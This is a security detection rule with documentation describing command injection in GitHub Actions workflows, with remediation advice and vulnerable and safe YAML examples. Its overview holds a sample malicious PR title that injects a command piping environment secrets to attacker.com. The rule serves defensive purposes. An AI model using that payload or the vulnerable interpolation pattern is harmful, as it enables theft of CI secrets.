---
confidence: high
cwe:
    - CWE-77
description: Detects GitHub Actions workflow files that interpolate untrusted event data into run steps, enabling CI/CD pipeline injection.
languages:
    - yaml
    - kotlin
    - dart
    - zig
    - elixir
name: GitHub Actions Command Injection
owasp:
    - A03:2025
severity: critical
tags:
    - devops
    - github-actions
    - ci-cd
    - injection
    - owasp-a03
version: 1.0.0
---

# GitHub Actions Command Injection

## Overview
GitHub Actions workflows that interpolate `${{ github.event.* }}` values directly into `run:` steps are vulnerable to command injection. A malicious PR title, issue body, or commit message can break out of the shell command and execute arbitrary code in the CI environment, exfiltrating secrets.

Example malicious PR title: `title"; env | curl -X POST attacker.com -d @-; echo "`

## Remediation
- Never use `${{ github.event.pull_request.title }}` directly in `run:` steps
- Pass event data as environment variables then reference `$ENV_VAR` in shell
- Use `github.sha`, `github.ref` (safe) rather than user-supplied metadata

**Vulnerable:**
```yaml
- run: echo "${{ github.event.issue.title }}"
```

**Safe:**
```yaml
- env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
  run: echo "$ISSUE_TITLE"
```
